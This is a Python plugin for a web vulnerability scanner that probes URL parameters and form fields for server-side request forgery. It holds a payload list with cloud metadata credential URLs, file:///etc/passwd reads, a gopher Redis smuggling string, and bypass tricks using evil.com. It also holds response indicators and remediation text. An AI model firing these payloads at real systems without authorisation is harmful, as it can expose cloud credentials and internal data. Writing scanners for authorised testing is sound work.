"""Server-Side Request Forgery (SSRF) detection plugin - Enhanced version."""

import re
from typing import List, Optional
from uuid import uuid4
from urllib.parse import urlparse, quote
from app.plugins.base import BaseDetector
from app.models.scan import DiscoveredEndpoint, Vulnerability, SeverityLevel, OWASPCategory
from app.services.http_client import HttpClient


# Comprehensive SSRF payloads organized by target type
SSRF_PAYLOADS = {
    # Localhost variations
    "localhost": [
        ("http://127.0.0.1", "ipv4_localhost"),
        ("http://localhost", "localhost_name"),
        ("http://127.0.0.1:80", "localhost_port80"),
        ("http://127.0.0.1:443", "localhost_port443"),
        ("http://127.0.0.1:22", "localhost_ssh"),
        ("http://127.0.0.1:3306", "localhost_mysql"),
        ("http://127.1", "short_ipv4"),
        ("http://0.0.0.0", "zero_ip"),
        ("http://0", "zero_short"),
        ("http://[::1]", "ipv6_localhost"),
        ("http://[0:0:0:0:0:0:0:1]", "ipv6_full"),
        ("http://127.0.0.1.nip.io", "dns_rebind_nip"),
        ("http://localtest.me", "dns_localhost"),
    ],
    # Cloud metadata endpoints
    "cloud_metadata": [
        ("http://169.254.169.254/latest/meta-data/", "aws_metadata"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws_iam"),
        ("http://169.254.169.254/latest/user-data/", "aws_userdata"),
        ("http://metadata.google.internal/computeMetadata/v1/", "gcp_metadata"),
        ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "gcp_token"),
        ("http://169.254.169.254/metadata/v1/", "digitalocean_metadata"),
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure_metadata"),
        ("http://100.100.100.200/latest/meta-data/", "alibaba_metadata"),
    ],
    # Internal network scanning
    "internal": [
        ("http://192.168.0.1", "internal_192"),
        ("http://192.168.1.1", "internal_gateway"),
        ("http://10.0.0.1", "internal_10"),
        ("http://172.16.0.1", "internal_172"),
    ],
    # Protocol smuggling
    "protocols": [
        ("file:///etc/passwd", "file_unix"),
        ("file:///c:/windows/win.ini", "file_windows"),
        ("file://localhost/etc/passwd", "file_localhost"),
        ("dict://127.0.0.1:6379/info", "dict_redis"),
        ("gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a", "gopher_redis"),
        ("ftp://127.0.0.1:21", "ftp_local"),
    ],
    # Bypass techniques
    "bypass": [
        ("http://127.0.0.1%00@evil.com", "null_byte"),
        ("http://evil.com@127.0.0.1", "authority_confusion"),
        ("http://127.0.0.1#@evil.com", "fragment_bypass"),
        ("http://127。0。0。1", "unicode_dot"),
        ("http://①②⑦.0.0.①", "unicode_numbers"),
        ("http://2130706433", "decimal_ip"),  # 127.0.0.1 as decimal
        ("http://0x7f000001", "hex_ip"),  # 127.0.0.1 as hex
        ("http://017700000001", "octal_ip"),  # 127.0.0.1 as octal
        ("http://127.0.0.1/..;/", "path_traversal"),
        ("http://localhost%23@stock.weliketoshop.net/", "fragment_confusion"),
    ],
}

# URL-like parameter names that might be vulnerable
URL_PARAMS = [
    "url", "uri", "path", "src", "href", "link", "redirect", "next", 
    "target", "dest", "destination", "file", "load", "fetch", "page",
    "document", "doc", "site", "html", "data", "reference", "ref",
    "domain", "host", "to", "out", "view", "dir", "show", "navigation",
    "open", "callback", "return", "returnurl", "return_url", "checkout_url",
    "continue", "image", "img", "icon", "logo", "feed", "proxy",
]

# Indicators of successful SSRF
SSRF_INDICATORS = {
    # File content indicators
    "file_content": [
        "root:x:", "root:*:", "daemon:", "bin:",  # /etc/passwd
        "[extensions]", "[fonts]", "[mci extensions]",  # win.ini
    ],
    # Cloud metadata indicators
    "aws": [
        "ami-id", "instance-id", "instance-type", "local-hostname",
        "public-hostname", "security-groups", "AccessKeyId", "SecretAccessKey",
    ],
    "gcp": [
        "computeMetadata", "attributes/", "project-id", "numeric-project-id",
        "access_token", "service-accounts",
    ],
    "azure": [
        "compute", "vmId", "subscriptionId", "resourceGroupName",
    ],
    # Error indicators (can reveal SSRF capability)
    "errors": [
        "connection refused", "couldn't connect", "failed to connect",
        "no route to host", "network is unreachable", "connection timed out",
        "name or service not known", "getaddrinfo failed",
    ],
    # Internal service indicators
    "internal": [
        "redis_version", "nginx", "apache", "internal server",
    ],
}


class SSRFDetector(BaseDetector):
    """Enhanced Server-Side Request Forgery detector."""

    name = "SSRF Detector"
    description = "Detects SSRF with cloud metadata, protocol smuggling, and bypass techniques"

    async def detect(
        self,
        endpoint: DiscoveredEndpoint,
        http_client: HttpClient,
    ) -> List[Vulnerability]:
        vulnerabilities = []
        
        # Find URL-like parameters
        url_params = self._find_url_params(endpoint.parameters)
        
        for param in url_params:
            vuln = await self._test_parameter(endpoint, param, http_client)
            if vuln:
                vulnerabilities.append(vuln)
        
        # Test forms with URL inputs
        for form in endpoint.forms:
            for inp in form.get("inputs", []):
                input_name = inp.get("name", "").lower()
                if any(url_p in input_name for url_p in URL_PARAMS):
                    vuln = await self._test_form_input(endpoint, form, inp, http_client)
                    if vuln:
                        vulnerabilities.append(vuln)
        
        return vulnerabilities

    def _find_url_params(self, parameters: List[str]) -> List[str]:
        """Find parameters that might accept URLs."""
        found = []
        for param in parameters:
            param_lower = param.lower()
            if any(url_p in param_lower for url_p in URL_PARAMS):
                found.append(param)
        return found if found else parameters[:2]  # Test first 2 if none found

    async def _test_parameter(
        self,
        endpoint: DiscoveredEndpoint,
        param: str,
        http_client: HttpClient,
    ) -> Optional[Vulnerability]:
        # Test different payload categories
        for category, payloads in SSRF_PAYLOADS.items():
            for payload, payload_type in payloads:
                try:
                    response = await http_client.get(
                        endpoint.url,
                        params={param: payload}
                    )
                    
                    result = self._analyze_response(response.text, category)
                    if result:
                        indicator_type, evidence = result
                        severity = self._determine_severity(category, indicator_type)
                        
                        return Vulnerability(
                            id=str(uuid4()),
                            name=f"Server-Side Request Forgery ({payload_type})",
                            severity=severity,
                            owasp_category=OWASPCategory.A10_SSRF,
                            endpoint=endpoint.url,
                            method="GET",
                            parameter=param,
                            evidence=f"Category: {category}. {evidence}",
                            description=self._get_description(category, param, payload),
                            remediation=self._get_remediation(category),
                            confidence=0.85 if indicator_type != "errors" else 0.65,
                            detector_name=self.name,
                            raw_request=f"GET {endpoint.url}?{param}={quote(payload)}",
                        )
                except Exception:
                    continue
        
        return None

    async def _test_form_input(
        self,
        endpoint: DiscoveredEndpoint,
        form: dict,
        inp: dict,
        http_client: HttpClient,
    ) -> Optional[Vulnerability]:
        input_name = inp.get("name")
        if not input_name:
            return None
            
        # Test limited payloads for forms
        test_payloads = [
            ("http://127.0.0.1", "localhost", "localhost_form"),
            ("http://169.254.169.254/latest/meta-data/", "cloud_metadata", "aws_metadata_form"),
            ("file:///etc/passwd", "protocols", "file_form"),
        ]
        
        for payload, category, payload_type in test_payloads:
            try:
                data = {input_name: payload}
                response = await http_client.post(form["action"], data=data)
                
                result = self._analyze_response(response.text, category)
                if result:
                    indicator_type, evidence = result
                    return Vulnerability(
                        id=str(uuid4()),
                        name=f"SSRF in Form ({payload_type})",
                        severity=SeverityLevel.HIGH,
                        owasp_category=OWASPCategory.A10_SSRF,
                        endpoint=form["action"],
                        method="POST",
                        parameter=input_name,
                        evidence=evidence,
                        description=f"SSRF vulnerability in form field '{input_name}'",
                        remediation="Validate and whitelist allowed URLs/hosts",
                        confidence=0.80,
                        detector_name=self.name,
                    )
            except Exception:
                continue
        
        return None

    def _analyze_response(self, response_text: str, category: str) -> Optional[tuple]:
        """Analyze response for SSRF indicators. Returns (indicator_type, evidence)."""
        lower_text = response_text.lower()
        
        # Check for file content
        for indicator in SSRF_INDICATORS["file_content"]:
            if indicator.lower() in lower_text:
                return ("file_content", f"Local file content leaked: {indicator}")
        
        # Check for cloud metadata
        if category == "cloud_metadata":
            for cloud, indicators in [("aws", SSRF_INDICATORS["aws"]), 
                                       ("gcp", SSRF_INDICATORS["gcp"]),
                                       ("azure", SSRF_INDICATORS["azure"])]:
                for indicator in indicators:
                    if indicator.lower() in lower_text:
                        return ("cloud_metadata", f"{cloud.upper()} metadata exposed: {indicator}")
        
        # Check for internal service responses
        for indicator in SSRF_INDICATORS["internal"]:
            if indicator.lower() in lower_text:
                return ("internal", f"Internal service response detected: {indicator}")
        
        # Check for error indicators (weaker signal)
        for indicator in SSRF_INDICATORS["errors"]:
            if indicator.lower() in lower_text:
                return ("errors", f"Network error suggests SSRF capability: {indicator}")
        
        return None

    def _determine_severity(self, category: str, indicator_type: str) -> SeverityLevel:
        """Determine severity based on what was accessed."""
        if indicator_type == "cloud_metadata":
            return SeverityLevel.CRITICAL  # Can lead to full cloud compromise
        if indicator_type == "file_content":
            return SeverityLevel.CRITICAL
        if category == "protocols":
            return SeverityLevel.HIGH
        if indicator_type == "errors":
            return SeverityLevel.MEDIUM  # Just indicates capability
        return SeverityLevel.HIGH

    def _get_description(self, category: str, param: str, payload: str) -> str:
        """Get detailed description based on SSRF type."""
        base = f"SSRF vulnerability in parameter '{param}'. "
        
        if category == "cloud_metadata":
            return base + "The application can access cloud metadata services, potentially exposing IAM credentials and sensitive configuration."
        elif category == "localhost":
            return base + "The application can make requests to localhost, enabling access to internal services."
        elif category == "protocols":
            return base + f"The application accepts the {payload.split(':')[0]} protocol, potentially allowing file read or protocol smuggling."
        elif category == "bypass":
            return base + "SSRF filters can be bypassed using encoding tricks or URL parsing inconsistencies."
        else:
            return base + "The application makes server-side requests to user-controlled URLs."

    def _get_remediation(self, category: str) -> str:
        """Get remediation advice based on SSRF type."""
        base = "Validate and whitelist allowed destination hosts. "
        
        if category == "cloud_metadata":
            return base + "Block requests to cloud metadata IPs (169.254.169.254). Use IMDSv2 on AWS."
        elif category == "protocols":
            return base + "Restrict to HTTP/HTTPS protocols only. Disable file:// and other dangerous protocols."
        elif category == "bypass":
            return base + "Use a URL parsing library consistently. Normalize URLs before validation."
        else:
            return base + "Implement a server-side proxy with strict URL validation. Consider using an allowlist of domains."
